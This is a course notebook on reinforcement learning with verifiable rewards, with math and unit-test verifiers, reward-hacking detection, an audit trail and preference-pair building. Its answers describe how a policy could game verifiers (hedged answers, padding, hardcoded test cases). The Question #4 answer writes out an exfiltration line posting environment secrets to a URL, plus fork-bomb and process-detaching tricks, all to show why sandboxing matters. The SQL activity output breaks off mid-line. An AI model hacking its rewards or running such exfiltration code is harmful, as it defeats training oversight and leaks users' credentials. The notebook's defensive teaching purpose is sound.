# Reinforcement Learning with Verifiable Rewards (RLVR)

In Session 15 we changed a model's weights with GRPO, rewarding it for verifiably correct answers. This session zooms into the other half of that loop — the **verifier** — and the data pipeline built around it. No GPU required: we run the RLVR sampling-and-verification loop against an API model, so the focus stays on the part that makes or breaks reinforcement learning on language models: the reward signal itself.

The RLVR loop looks like this:

```text
prompt -> sample N completions -> verify each against a deterministic checker
       -> assign rewards -> keep verified-correct samples as preference data
       -> policy update -> repeat
```

Unlike RLHF, there is no learned reward model and no human labeler in the loop. The reward comes from a *deterministic program* — a math answer checker, a unit-test runner — that either passes a completion or doesn't. That makes the signal cheap, objective, and reproducible. It also makes it a target: any policy trained against a verifier will find and exploit its blind spots, so we will also build reward-hacking detection and an audit trail that records every verifier decision.

## Learning Outcomes

By the end of this notebook, you will be able to:

- Explain how RLVR differs from RLHF, and what makes a reward "verifiable."
- Implement verifiable reward functions for math (exact-answer matching) and code (unit-test execution).
- Run the sample-and-verify loop and interpret group-level accuracy.
- Detect reward-hacking signatures and maintain a verifier audit trail.
- Construct chosen/rejected preference pairs ready for DPO-style training — or reward signals ready for GRPO.

## Table of Contents

- **Breakout Room #1: The Verifiable Reward Loop**
  - Task 1: Environment Setup
  - Task 2: Problems and Answer Extraction
  - Task 3: A Math Reward Function
  - Question #1 and Question #2
  - Task 4: Sample and Verify
- **Breakout Room #2: Reward Hacking, Code Verification, and Preference Data**
  - Task 5: Reward-Hacking Detection and the Audit Trail
  - Question #3
  - Task 6: A Code Verifier
  - Question #4
  - Task 7: Build Preference Pairs
  - Activity #1
- **Conclusion: What We Built, Start to Finish**
- **What Looks Different in Production**

---
# Breakout Room #1
## The Verifiable Reward Loop

We build the core RLVR machinery: a small set of math problems with known answers, a deterministic answer checker, a reward function, and the sample-and-verify loop that turns them into training signal.

## Task 1: Environment Setup

From the `16_RLVR` folder, install dependencies with uv:

```bash
uv sync
```

Then open this notebook in Cursor or VS Code and select the Python/Jupyter environment created by uv.

You will need an [OpenAI API key](https://platform.openai.com/api-keys). Enter it below — it is kept in memory for this session only.

In [25]:
import os
import getpass

os.environ["OPENAI_API_KEY"] = getpass.getpass("OpenAI API Key: ")

### The Policy

In RL terms, the model we sample from is the **policy**. We deliberately use a small model (`gpt-4.1-nano`) at temperature 1.0: a policy that is *sometimes wrong* is exactly what we want, because the contrast between verified-correct and verified-incorrect samples is where the training signal lives. A policy that never fails produces no gradient — and no preference pairs.

In [26]:
from openai import OpenAI

client = OpenAI()

MODEL = "gpt-4.1-nano"  # small on purpose: we *want* some wrong answers


def simple_complete(prompt: str, system: str = "", temperature: float = 1.0) -> str:
    """One completion from the policy model."""
    messages = [{"role": "system", "content": system}] if system else []
    messages.append({"role": "user", "content": prompt})
    response = client.chat.completions.create(
        model=MODEL,
        messages=messages,
        temperature=temperature,
    )
    return response.choices[0].message.content


print(simple_complete("Reply with exactly: policy online"))

policy online


## Task 2: Problems and Answer Extraction

RLVR only works in domains where correctness can be *checked by a program*. Math word problems with a single numeric answer are the canonical example (this is why GSM8K shows up in every RLVR paper — and in Session 15).

Two conventions make checking reliable:

1. Each problem carries a **ground-truth answer** as a string.
2. The prompt instructs the policy to put its final answer in `\boxed{}` — the same convention GSM8K-style training uses — so extraction is a regex, not a judgment call. If no box is found, we fall back to the last number in the text.

In [27]:
import re
from dataclasses import dataclass


@dataclass
class Problem:
    question: str
    answer: str  # ground truth


problems = [
    Problem("What is 12 * 13?", "156"),
    Problem("If a train covers 60 km in 45 minutes, what is its speed in km/h?", "80"),
    Problem("What is the sum of the first 10 positive integers?", "55"),
    Problem(
        "A store discounts a $250 jacket by 20%, then adds 10% sales tax on the discounted price. "
        "What is the final price in dollars?",
        "220",
    ),
    Problem("How many positive divisors does 360 have?", "24"),
]


def extract_number(text: str) -> str:
    r"""Pull the final answer out of a completion: \boxed{...} first, last number as fallback."""
    boxed = re.search(r"\\boxed\{([^}]+)\}", text)
    if boxed:
        return boxed.group(1).strip()
    numbers = re.findall(r"-?\d+\.?\d*", text)
    return numbers[-1] if numbers else ""


assert extract_number(r"Step 1: 12*13 = 156. The answer is \boxed{156}.") == "156"
assert extract_number("So the speed is 80 km/h") == "80"
assert extract_number("no numbers here") == ""
print("extraction OK")

extraction OK


## Task 3: A Math Reward Function

The reward function is where verification becomes training signal:

- **+1.0** if the extracted answer matches the ground truth,
- **−0.1** otherwise.

Note the asymmetry: full credit for success, only a *small* penalty for failure. We also normalize numerically (`"80"` and `"80.0"` should match) — a verifier that fails on formatting technicalities punishes correct reasoning, which is the fastest way to teach a policy the wrong lesson.

In [28]:
class MathRewardFunction:
    """Verifiable reward for math problems: exact answer match against ground truth."""

    correct_reward = 1.0
    incorrect_penalty = -0.1

    def compute(self, response: str, ground_truth: str) -> float:
        prediction = extract_number(response)
        if self._normalize(prediction) == self._normalize(ground_truth):
            return self.correct_reward
        return self.incorrect_penalty

    @staticmethod
    def _normalize(value: str):
        """Compare numerically when possible, so '80' == '80.0'."""
        try:
            return float(value)
        except ValueError:
            return value.strip()


reward_fn = MathRewardFunction()

assert reward_fn.compute(r"The speed is \boxed{80}", "80.0") == 1.0
assert reward_fn.compute(r"The speed is \boxed{81}", "80") == -0.1
assert reward_fn.compute("I cannot solve this.", "80") == -0.1
print("reward function OK")

reward function OK


#### ❓ Question #1

In your own words: what makes a reward "verifiable," and how does RLVR differ from RLHF's learned reward model? Give one task where a verifiable reward exists and one where it fundamentally cannot (and explain why).

##### Answer:

A reward is "verifiable" when correctness can be checked by a fixed, deterministic procedure — a parser, a unit test, a code execution sandbox, a math equality check — with no model in the loop making a judgment call. Given the response and the ground truth, the reward is a pure function: same inputs always produce the same score, and you could hand the check to a human with a rulebook and get identical results.

RLHF's reward model is the opposite: it's a learned approximator trained on human preference comparisons, standing in for "would a human like this?" It's differentiable, generalizes to fuzzy criteria like tone or helpfulness, but it's also gameable — the policy can learn to exploit quirks of the reward model itself (reward hacking) since the reward model's judgment isn't grounded in anything checkable. RLVR (RL with verifiable rewards) swaps that learned proxy for a ground-truth checker, so there's no separate model to hack — you can only get reward by actually producing a correct output, at least to the extent the checker's coverage is complete.

Verifiable example: the math problems above. extract_number plus exact match against a known answer is deterministic and unambiguous — 156 is either the answer to 12*13 or it isn't.

Fundamentally non-verifiable example: "write a short story that's emotionally moving." There's no ground truth to check against and no procedure that outputs a scalar correctness signal — quality here is a matter of subjective human taste that varies across readers, which is exactly the kind of task RLHF's learned reward model exists for, and exactly what RLVR can't touch.

#### ❓ Question #2

The reward is asymmetric: +1.0 for a correct answer but only −0.1 for an incorrect one. Suppose we used −1.0 instead. What behavior might a policy learn during early training, when most of its attempts fail? (Hint: think about a model that discovers it can hedge, refuse, or produce no parseable answer at all.)

##### Answer:

With a symmetric -1.0 penalty, the policy's early-training incentive gradient shifts. Right now, -0.1 for wrong vs +1.0 for right means "attempt and get it wrong" is only mildly worse than doing nothing productive — the model is still nudged to keep trying to produce parseable numeric answers, since the downside of guessing is small relative to the upside of occasionally landing on +1.0.

Flip the incorrect penalty to -1.0 and the expected value math changes: an early policy that's mostly wrong (say 90% failure rate) sees an attempted answer as a coin flip between +1.0 and -1.0 with a strongly negative expectation, whereas refusing, hedging ("I'm not sure, it could be X or Y"), or producing a response with no extractable number entirely dodges the -1.0 floor — extract_number returns "" on unparseable text, which under this scheme presumably still scores as incorrect (-1.0) unless refusals are handled specially. But the real risk shows up if the policy learns any way to make the response non-committal enough that gradient signal is weak or the penalty is softened by verbosity/format tricks — e.g., burying several candidate numbers in the text so the extractor's "last number" fallback sometimes gets lucky, or padding with disclaimers that don't change the extracted answer but reduce how confidently the policy "commits" during sampling.

More concretely, the classic failure mode with symmetric penalties is reward variance collapse toward avoidance: since guessing wrong now costs as much as it would to just not engage, a struggling policy can learn that hedged, low-commitment, or evasive outputs are less risky than genuine attempts, especially if there's any path to a small positive or neutral outcome (partial credit, retries, or the grader missing a valid number and returning a lower penalty by accident). This trains the model toward "sound like I'm working the problem without actually box-ing a final number," rather than toward the intended behavior of trying harder to reach a correct answer. That's exactly why the asymmetric -0.1 is a common design choice — it keeps the expected value of attempting positive-ish even at low accuracy, so early gradients still push toward "produce a concrete, checkable guess" rather than toward reward-avoidant hedging.

## Task 4: Sample and Verify

Now the heart of RLVR: for each problem, sample a **group** of completions at temperature 1.0 and verify every one.

Sampling groups (rather than one completion per prompt) is not incidental — it is the same structure GRPO consumed in Session 15, where each completion's advantage was computed *relative to its group's average reward*. Here the group serves a second purpose too: correct and incorrect completions of the same prompt become the raw material for preference pairs in Breakout Room #2.

In [29]:
from dataclasses import asdict


@dataclass
class Sample:
    problem: str
    response: str
    extracted: str
    reward: float
    verified_correct: bool


def sample_and_verify(problem: Problem, n_samples: int = 4) -> list[Sample]:
    """Sample a group of completions for one problem and verify each one."""
    group = []
    for _ in range(n_samples):
        response = simple_complete(
            f"Solve step by step. Put the final numeric answer in \\boxed{{}}.\n\n{problem.question}",
            system="You are a careful mathematician. Show your work, then box the final number.",
        )
        extracted = extract_number(response)
        reward = reward_fn.compute(response, problem.answer)
        group.append(
            Sample(
                problem=problem.question,
                response=response,
                extracted=extracted,
                reward=reward,
                verified_correct=reward > 0,
            )
        )
    return group


groups = [sample_and_verify(p) for p in problems]

total = sum(len(g) for g in groups)
correct = sum(s.verified_correct for g in groups for s in g)
print(f"Verified-correct rate: {correct / total:.0%} ({correct}/{total})\n")
for problem, group in zip(problems, groups):
    print(f"  {sum(s.verified_correct for s in group)}/{len(group)}  {problem.question[:70]}")

Verified-correct rate: 85% (17/20)

  4/4  What is 12 * 13?
  1/4  If a train covers 60 km in 45 minutes, what is its speed in km/h?
  4/4  What is the sum of the first 10 positive integers?
  4/4  A store discounts a $250 jacket by 20%, then adds 10% sales tax on the
  4/4  How many positive divisors does 360 have?


> NOTE: If your verified-correct rate is 100%, the contrast that drives learning is missing — swap in a smaller model, raise the temperature, or add harder problems until some samples fail.

Let's inspect one failure — reading verifier-rejected completions is how you learn what your policy actually gets wrong (arithmetic slips? misread units? unparseable formatting?):

In [30]:
incorrect = [s for g in groups for s in g if not s.verified_correct]
if incorrect:
    sample = incorrect[0]
    print(f"Problem:   {sample.problem}")
    print(f"Extracted: {sample.extracted!r}  (ground truth mismatch, reward {sample.reward})\n")
    print(sample.response)
else:
    print("No incorrect samples this run - try a harder problem or higher temperature.")

Problem:   If a train covers 60 km in 45 minutes, what is its speed in km/h?
Extracted: '80\\, \\text{km/h'  (ground truth mismatch, reward -0.1)

Let's analyze the problem step-by-step.

**Step 1:** Understand the given information.
- Distance covered = 60 km
- Time taken = 45 minutes

**Step 2:** Convert time from minutes to hours because we want the speed in km/h.
\[ 45\, \text{minutes} = \frac{45}{60}\, \text{hours} = \frac{3}{4}\, \text{hours} \]

**Step 3:** Use the formula for speed:
\[
\text{Speed} = \frac{\text{Distance}}{\text{Time}}
\]
Plugging in the values:
\[
\text{Speed} = \frac{60\, \text{km}}{\frac{3}{4}\, \text{hours}}
\]

**Step 4:** Simplify the division:
\[
\text{Speed} = 60 \times \frac{4}{3} = \frac{60 \times 4}{3} = \frac{240}{3} = 80
\]

**Final answer:**

\[
\boxed{80\, \text{km/h}}
\]


## Breakout Room #1 Summary

- Verifiable rewards come from deterministic checkers, not human preference or a learned reward model — cheap, objective, reproducible.
- The `\boxed{}` convention plus numeric normalization makes extraction mechanical; a brittle verifier punishes correct reasoning and corrupts the signal.
- Asymmetric rewards (+1.0 / −0.1) keep early training from collapsing into refusal.
- Sampling *groups* of completions per prompt is the same structure GRPO trains on — and it produces the correct/incorrect contrast that preference data needs.

---
# Breakout Room #2
## Reward Hacking, Code Verification, and Preference Data

A verifier is not just a metric — once you train against it, it *is* the objective. This room covers what happens then: policies that exploit the verifier's blind spots, a second verifiable domain (code judged by unit tests), and turning audited verifier output into preference data.

## Task 5: Reward-Hacking Detection and the Audit Trail

Goodhart's law — *"when a measure becomes a target, it ceases to be a good measure"* — is the central operational risk of RLVR. A policy optimized against an exact-match verifier will happily learn to:

- emit a bare boxed answer with no reasoning (guessing is cheap when only the box is checked),
- parrot numbers that appear in the prompt,
- or exploit extraction quirks instead of solving the problem.

Two defenses, both borrowed from how production RLVR systems are reviewed:

1. **Flag hack signatures.** Here we flag verified-correct samples that show *no visible work* — a right answer without reasoning is the classic signature of guessing or leakage.
2. **Log every verifier decision** to an append-only audit trail (`artifacts/verifier.jsonl`). When someone — a teammate, an auditor, a regulator — asks whether your RL run was trained on honest rewards, this file is the answer.

In [31]:
import json
from pathlib import Path

AUDIT_LOG = Path("artifacts/verifier.jsonl")
AUDIT_LOG.parent.mkdir(exist_ok=True)


def looks_like_hack(sample: Sample) -> bool:
    """Flag verified-correct samples that show no work.

    A correct boxed answer with no visible reasoning is the classic hack
    signature: the policy may be guessing, pattern-matching the prompt, or
    exploiting the extractor rather than solving the problem.
    """
    if not sample.verified_correct:
        return False
    work = sample.response.replace(f"\\boxed{{{sample.extracted}}}", "")
    numbers_in_work = re.findall(r"-?\d+\.?\d*", work)
    return len(sample.response.split()) < 20 or len(numbers_in_work) < 2


def audit_record(sample: Sample) -> dict:
    """Append one verifier decision to the audit trail and return it."""
    record = {**asdict(sample), "suspected_hack": looks_like_hack(sample)}
    with AUDIT_LOG.open("a") as f:
        f.write(json.dumps(record) + "\n")
    return record


records = [audit_record(s) for g in groups for s in g]
flagged = sum(r["suspected_hack"] for r in records)

print(f"Audited {len(records)} samples -> {flagged} flagged as hack-suspect")
print(f"Audit trail: {AUDIT_LOG} ({sum(1 for _ in AUDIT_LOG.open())} records total)")

Audited 20 samples -> 0 flagged as hack-suspect
Audit trail: artifacts/verifier.jsonl (40 records total)


#### ❓ Question #3

Our detector flags one signature: "right answer, no visible work." Name **two other ways** a policy could hack a `\boxed{}` exact-match verifier, and for each, describe how you would harden the verifier or the prompt against it. (Session 15's stacked format rewards are one relevant hardening example.)

##### Answer:

Two hack vectors beyond the silent-boxed-answer pattern, both a direct threat given the code we've built so far.

The first is answer-hedging via multiple candidates. extract_number does re.search for \boxed{...}, which returns the first match. A policy under RL pressure can learn to box a plausible-looking guess early, then keep reasoning (or free-associating) and drop several more numbers afterward — "...\boxed{80}... though it could also be 79 or 81 depending on rounding" — collecting reward whenever the first box happens to be right, with zero cost when it's wrong, since nothing currently penalizes hedging itself. It's the numeric equivalent of guessing multiple lottery tickets and only showing you the winning one. Hardening: treat "more than one \boxed{} in the response" (or hedge language like "might be" / "or" near the boxed span) as a format violation that zeroes the reward regardless of correctness — exactly the stacked-reward idea from session 15, where reward = format_gate * correctness_reward rather than correctness alone. A single required box, matched with re.fullmatch-style strictness on "exactly one occurrence," removes the exploit rather than just detecting it after the fact.

The second is gaming the auditor itself, which is a real risk the moment looks_like_hack stops being observation-only and starts influencing reward (even indirectly, e.g. as a training-set filter or a secondary penalty). The heuristic we wrote checks for < 20 words or < 2 numbers in the pre-box text — trivially satisfiable by padding with restated problem numbers or filler pseudo-reasoning that never actually derives the answer ("we have 60 km and 45 minutes, so with some calculation involving 60 and 45 we get..."). A policy optimized against this signal learns to satisfy the detector's pattern, not to reason. This is Goodhart's law one level up: any static, cheaply-reverse-engineerable check becomes an attack surface as soon as it's part of the loss. Hardening here isn't a better regex — it's a process guarantee: keep looks_like_hack strictly out of the training reward and use it only for human-facing monitoring/sampling (e.g., surface flagged samples for spot-check, track the flagged-rate as a health metric over training). If you do want an automated genuineness check in the loop, it needs to be non-static — an ensemble of varied heuristics, periodic refresh, or occasional held-out human labeling — so there's no single fixed target for the policy to learn against.

## Task 6: A Code Verifier

Math is one verifiable domain; **code judged by unit tests** is the other workhorse of RLVR. The verifier executes a candidate program against test cases and returns the *fraction that pass* — a graded reward in `[0.0, 1.0]` rather than math's binary match.

We run candidates in a subprocess with a timeout: a program that crashes, hangs, or exits non-zero simply earns no credit for that test case.

> ⚠️ We are executing model-generated code on your machine. For this demo the programs are trivial, but note the design: in production, this verifier runs inside a **sandbox** (container, gVisor, firecracker VM) — never on the host.

In [32]:
import subprocess
import sys


class CodeVerifier:
    """Score generated code by the fraction of test cases it passes."""

    timeout_seconds = 5

    def verify(self, code: str, test_cases: list[dict]) -> float:
        passed = 0
        for tc in test_cases:
            try:
                output = self._run(code, tc.get("input", ""))
                if output.strip() == str(tc["expected"]).strip():
                    passed += 1
            except Exception:
                pass  # crash, timeout, or non-zero exit -> no credit for this case
        return passed / len(test_cases) if test_cases else 0.0

    def _run(self, code: str, input_data: str = "") -> str:
        result = subprocess.run(
            [sys.executable, "-c", code],
            input=input_data,
            capture_output=True,
            text=True,
            timeout=self.timeout_seconds,
        )
        if result.returncode != 0:
            raise RuntimeError(result.stderr)
        return result.stdout


verifier = CodeVerifier()

# Sanity check with hand-written candidates: one correct, one buggy.
tests = [{"input": "3", "expected": "14"}, {"input": "10", "expected": "385"}]
good = "n = int(input()); print(sum(i * i for i in range(1, n + 1)))"
bad = "n = int(input()); print(sum(range(1, n + 1)))"  # sums i, not i^2

assert verifier.verify(good, tests) == 1.0
assert verifier.verify(bad, tests) == 0.0
print("code verifier OK")

code verifier OK


Now close the loop: have the **policy** write the program, and let the verifier score it — the exact reward signal a coding-RLVR run trains on.

In [33]:
CODING_TASK = (
    "Write a Python program that reads a single integer n from standard input "
    "and prints the sum of the squares of the integers from 1 to n (inclusive). "
    "Print only the number. Reply with only the code - no markdown fences, no explanation."
)

code_tests = [
    {"input": "1", "expected": "1"},
    {"input": "3", "expected": "14"},
    {"input": "10", "expected": "385"},
]


def strip_fences(text: str) -> str:
    """Remove markdown code fences if the policy ignores instructions."""
    return re.sub(r"^```(?:python)?\s*\n|\n?```\s*$", "", text.strip())


for i in range(3):
    candidate = strip_fences(simple_complete(CODING_TASK))
    score = verifier.verify(candidate, code_tests)
    print(f"candidate {i + 1}: reward = {score:.2f}")
    print("  " + candidate.replace("\n", "\n  ") + "\n")

candidate 1: reward = 1.00
  n = int(input())
  print(sum(i*i for i in range(1, n+1)))

candidate 2: reward = 1.00
  n = int(input())
  print(sum(i * i for i in range(1, n + 1)))

candidate 3: reward = 1.00
  n = int(input())
  print(sum(i * i for i in range(1, n + 1)))



#### ❓ Question #4

The code verifier returns *fractional* rewards (fraction of tests passed) while the math verifier is binary. What are the benefits and risks of partial credit as a training signal? And concretely: what could a policy-generated program do to a verifier that runs candidates directly on the host, and which parts of that threat does our timeout **not** cover?

##### Answer:

Partial credit versus binary reward is fundamentally a bias/exploitability tradeoff. The benefit is signal density: with a binary "all tests pass or nothing" reward on a moderately hard task, an early-training policy that fails 100% of attempts gets a flat zero everywhere — no gradient to distinguish "wrote a syntax error" from "solved it but off by one." Fractional credit (2/3 tests passing) gives the optimizer something to climb, and it also reduces the odds of a fully degenerate reward batch (all-zero, no variance) which matters a lot for group-relative methods like GRPO where the advantage is computed against the batch mean — an all-zero group gives literally nothing to learn from.

The risk is that fractional credit rewards partial correctness on the visible test set specifically, not partial progress toward a general algorithm, and those aren't the same thing. With only three fixed test cases (n=1, 3, 10) repeated every rollout, a policy under enough RL pressure can learn to special-case those exact inputs — if n==1: print(1); elif n==3: print(14); elif n==10: print(385) — and collect full reward without ever deriving sum-of-squares. Binary all-or-nothing at least forces exact agreement across the whole suite, but doesn't prevent this either at 3 cases; fractional credit actually makes the failure mode worse because it also rewards hardcoding a subset, giving a policy stepping stones toward memorizing the entire visible test bank case by case rather than generalizing. The fix isn't going back to binary — it's held-out test cases the policy never sees in the prompt, generated fresh per rollout (randomize n), so memorization can't substitute for the algorithm.

On the host-execution question: subprocess.run([sys.executable, "-c", code], ...) with no env= restriction means the child inherits the full parent environment — including OPENAI_API_KEY if it's set in this process. A generated program doesn't need to be sophisticated to exfiltrate it; import os, socket; requests.post(url, data=os.environ) (or even a bare DNS lookup encoding the key) would work, and nothing in this verifier stops it — there's no network isolation at all. Beyond that, the code runs with the verifier's own filesystem permissions: it can read or delete files in the cwd (including artifacts/verifier.jsonl, the audit log itself), write arbitrary data to disk, or — more subtly — read its own execution context via /proc/self/environ or /proc/self/cmdline on Linux to probe how it's being invoked.

The timeout only bounds wall-clock time of the direct subprocess, and that leaves several gaps open even within the 5 seconds: it doesn't cap memory (a program can allocate enough RAM to trigger the OOM killer and take down other processes on a shared host before the timeout fires), it doesn't cap CPU/thread/process count (a fork bomb or thread-spawn loop can spike load before termination), and critically, subprocess.run's timeout kills the direct child but not any grandchildren it spawned — a double-forking or Popen(..., start_new_session=True) call can detach a process from the tree entirely, so it keeps running (a listening socket, a background loop) after verify() returns and the "5 second" window has closed. None of disk writes, network calls, or environment access are time-bounded at all — they're bounded only by what's physically possible in 5 seconds, which for exfiltrating a single API key is effectively zero seconds.






## Task 7: Build Preference Pairs

Finally, we turn audited verifier output into training data. Within each group:

- **chosen** = verified-correct samples that were *not* flagged as hack-suspect,
- **rejected** = verified-incorrect samples,

and we take the cross product. The resulting `{prompt, chosen, rejected}` records are exactly the format [DPO-style trainers](https://huggingface.co/docs/trl/dpo_trainer) consume — while GRPO (Session 15) skips the pairing and uses the group rewards directly. Same verifier, two consumers.

Excluding flagged samples matters: a hack-suspect completion used as "chosen" would teach the next policy iteration to hack *more*.

In [34]:
def build_preferences(groups: list[list[Sample]], records: list[dict]) -> list[dict]:
    """Cross verified-correct (unflagged) winners with incorrect losers, per group."""
    flagged_responses = {r["response"] for r in records if r["suspected_hack"]}
    pairs = []
    for group in groups:
        winners = [s for s in group if s.verified_correct and s.response not in flagged_responses]
        losers = [s for s in group if not s.verified_correct]
        pairs.extend(
            {"prompt": winner.problem, "chosen": winner.response, "rejected": loser.response}
            for winner in winners
            for loser in losers
        )
    return pairs


pairs = build_preferences(groups, records)

PREFERENCES = Path("artifacts/preferences.jsonl")
with PREFERENCES.open("w") as f:
    for pair in pairs:
        f.write(json.dumps(pair) + "\n")

print(f"{len(pairs)} preference pairs -> {PREFERENCES}\n")
if pairs:
    example = pairs[0]
    print(f"prompt:   {example['prompt']}")
    print(f"chosen:   {example['chosen'][:120]}...")
    print(f"rejected: {example['rejected'][:120]}...")
else:
    print("No pairs this run - you need at least one correct AND one incorrect sample in the same group.")

3 preference pairs -> artifacts/preferences.jsonl

prompt:   If a train covers 60 km in 45 minutes, what is its speed in km/h?
chosen:   Let's break down the problem step by step:

1. **Identify the given information:**
   - Distance traveled: 60 km
   - Ti...
rejected: Let's analyze the problem step-by-step.

**Step 1:** Understand the given information.
- Distance covered = 60 km
- Time...


#### 🏗️ Activity #1: Build Your Own Verifier

Math answers and unit tests are only two verifiable domains. Pick another — for example:

- **JSON schema conformance**: does the completion parse and validate against a schema?
- **SQL correctness**: does a generated query return the same rows as a reference query on a fixture database?
- **Regex/string transformation**: does the output match a deterministic expected transformation of the input?

Then, in the cell below:

1. Implement a reward function for your domain (binary or fractional — justify the choice).
2. Run the sample-and-verify loop over at least 3 prompts with `n_samples >= 3`.
3. Report the verified-correct rate, and note any hack-suspect behavior you observe (and how you'd detect it).

In [37]:
### YOUR CODE HERE
"""
Activity #1: verifiable reward for a new domain -- SQL correctness.

A candidate SQL query is scored by running it against a fixture database and
comparing its result rows to a reference query's result rows. Row-set
comparison decomposes into precision/recall, so fractional reward (F1 over
returned rows) is the better choice here: it distinguishes "returned the
right rows plus noise" from "returned nothing" from "returned a wrong but
plausible set", all of which collapse to the same 0 under exact-match binary
scoring. We still report a binary "correct" (F1 == 1.0) for the headline
rate, since that's the meaningful accuracy signal for reporting -- the
fractional score is what you'd actually train against.

Candidates are sampled live from the policy model (mirrors Task 4's
sample_and_verify loop), not hardcoded.
"""
import re
import sqlite3
from dataclasses import dataclass

FIXTURE_ROWS = [
    (1, "alice", 120.0, "completed"),
    (2, "alice", 45.0, "refunded"),
    (3, "bob", 300.0, "completed"),
    (4, "carol", 80.0, "completed"),
    (5, "carol", 150.0, "refunded"),
    (6, "dave", 60.0, "pending"),
    (7, "bob", 20.0, "completed"),
]


def fresh_db() -> sqlite3.Connection:
    """New in-memory DB per call -- cheap, and means a mutating statement that
    somehow slips past the guard below can't contaminate later candidates."""
    conn = sqlite3.connect(":memory:")
    conn.execute("CREATE TABLE orders (id INTEGER, customer TEXT, amount REAL, status TEXT)")
    conn.executemany("INSERT INTO orders VALUES (?, ?, ?, ?)", FIXTURE_ROWS)
    conn.commit()
    return conn


@dataclass
class SqlProblem:
    prompt: str
    reference_sql: str


problems = [
    SqlProblem(
        "Return the distinct customer names of anyone who placed an order over $100.",
        "SELECT DISTINCT customer FROM orders WHERE amount > 100",
    ),
    SqlProblem(
        "Return each customer's total amount spent, counting only completed orders.",
        "SELECT customer, SUM(amount) FROM orders WHERE status='completed' GROUP BY customer",
    ),
    SqlProblem(
        "Return the id and customer of every refunded order.",
        "SELECT id, customer FROM orders WHERE status='refunded'",
    ),
]


class SqlVerifier:
    def run_readonly(self, conn: sqlite3.Connection, sql: str) -> list[tuple]:
        stripped = sql.strip().rstrip(";")
        if not re.match(r"(?is)^\s*select\b", stripped):
            raise ValueError("non-SELECT statement blocked")
        # cursor.execute (not executescript) refuses multiple stacked statements,
        # so "SELECT 1; DROP TABLE orders;" raises rather than executing the drop.
        cur = conn.execute(stripped)
        return cur.fetchall()
    
    # It runs the candidate SQL on a fresh DB, catches any exception (bad syntax, blocked statement, whatever) 
    # and returns 0.0 with a note explaining why. If it succeeds, it converts both the candidate's result rows
    # and the expected rows into Python sets and computes standard information-retrieval metrics

    # Precision = correct rows returned / total rows returned, 
    # Recall = correct rows returned / total rows expected, and 
    # F1 = the harmonic mean of the two. 
    # That's why partial correctness is possible — a query that returns 3 of 3 expected rows plus 1 extra
    # junk row gets a lower score than one that returns exactly the 3, rather than both being binary "wrong."
    

    def score(self, candidate_sql: str, expected_rows: set) -> tuple[float, str]:
        """Returns (F1 reward, note). note carries crash/hack info for reporting."""
        try:
            conn = fresh_db()
            result = set(self.run_readonly(conn, candidate_sql))
            conn.close()
        except Exception as e:
            return 0.0, f"execution failed: {e}"

        inter = result & expected_rows
        precision = len(inter) / len(result) if result else 0.0
        recall = len(inter) / len(expected_rows) if expected_rows else 0.0
        f1 = 2 * precision * recall / (precision + recall) if (precision + recall) else 0.0
        note = f"rows_returned={len(result)} expected={len(expected_rows)} overlap={len(inter)}"
        return f1, note


def looks_like_sql_hack(candidate_sql: str, reference_sql: str, f1: float) -> str | None:
    """Cheap syntactic signatures, same spirit as the math no-visible-work check."""
    c, r = candidate_sql.lower(), reference_sql.lower()
    if f1 > 0 and "from orders" not in c:
        return "no reference to source table -- looks hardcoded"
    if "where" in r and "where" not in c:
        return "reference filters with WHERE, candidate has none -- likely dumping the whole table"
    if "select *" in c and "select *" not in r:
        return "SELECT * overreach vs explicit column list in reference"
    return None

# Cleans the model's raw text response: strips ```sql / ``` fences, then scans line by line for the
# first one starting with SELECT and returns just that line.

def extract_sql(text: str) -> str:
    """Strip markdown fences/prose, keep the first line that looks like SQL."""
    text = re.sub(r"```(?:sql)?\s*\n?|\n?```", "", text.strip())
    for line in text.splitlines():
        line = line.strip()
        if re.match(r"(?i)^select\b", line):
            return line
    return text.strip()  # fallback: hope for the best, verifier will reject bad SQL


SCHEMA = "orders(id, customer, amount, status)"


def build_sql_prompt(sql_problem: SqlProblem) -> str:
    return (
        f"Schema: {SCHEMA}\n"
        f"Question: {sql_problem.prompt}\n"
        "Reply with only a single SQLite SELECT. No markdown, no explanation."
    )


verifier = SqlVerifier()


def sample_and_verify_sql(sql_problem: SqlProblem, n_samples: int = 3) -> list[dict]:
    """Sample a group of SQL candidates for one problem and score each one."""
    ref_conn = fresh_db()
    expected = set(verifier.run_readonly(ref_conn, sql_problem.reference_sql))
    ref_conn.close()

    print(f"\nPrompt: {sql_problem.prompt}")
    print(f"  reference: {sql_problem.reference_sql}")
    print(f"  expected rows: {sorted(expected)}")

    group = []
    for j in range(n_samples):
        raw = simple_complete(build_sql_prompt(sql_problem))
        candidate = extract_sql(raw)
        f1, note = verifier.score(candidate, expected)
        is_correct = f1 >= 0.999
        hack = looks_like_sql_hack(candidate, sql_problem.reference_sql, f1)
        flag = " <-- hack-suspect" if hack else ""
        print(f"    sample {j + 1}: reward={f1:.2f} correct={is_correct}  {note}{flag}")
        print(f"      sql: {candidate}")
        group.append({"candidate": candidate, "f1": f1, "correct": is_correct, "hack": hack})
    return group


sql_groups = [sample_and_verify_sql(p) for p in problems]

total = sum(len(g) for g in sql_groups)
correct = sum(s["correct"] for g in sql_groups for s in g)
hack_notes = [
    (p.prompt, s["candidate"], s["hack"])
    for p, group in zip(problems, sql_groups)
    for s in group
    if s["hack"]
]

print(f"\nVerified-correct rate: {correct / total:.0%} ({correct}/{total})")
print(f"\nHack-suspect samples ({len(hack_notes)}):")
for prompt, sql, reason in hack_notes:
    print(f"  - [{prompt[:45]}...] {reason}\n    sql: {sql}")


Prompt: Return the distinct customer names of anyone who placed an order over $100.
  reference: SELECT DISTINCT customer FROM orders WHERE amount > 100
  expected rows: [('alice',), ('bob',), ('carol',)]
    sample 1: reward=1.00 correct=True  rows_returned=3 expected=3 overlap=3
      sql: SELECT DISTINCT customer FROM orders WHERE amount > 100;
    sample 2: reward=1.00 correct=True  rows_returned=3 expected=3 overlap=3
      sql: SELECT DISTINCT customer FROM orders WHERE amount > 100;
    sample 3: reward=1.00 correct=True  rows_returned=3 expected=3 overlap=3
      sql: SELECT DISTINCT customer FROM orders WHERE amount > 100;

Prompt: Return each customer's total amount spent, counting only completed orders.
  reference: SELECT customer, SUM(amount) FROM orders WHERE status='completed' GROUP BY customer
  expected rows: [('alice', 120.0), ('bob', 320.0), ('carol', 80.0)]
    sample 1: reward=0.00 correct=False  execution failed: no such column: customer <-- hack-suspect
      sq

## Breakout Room #2 Summary

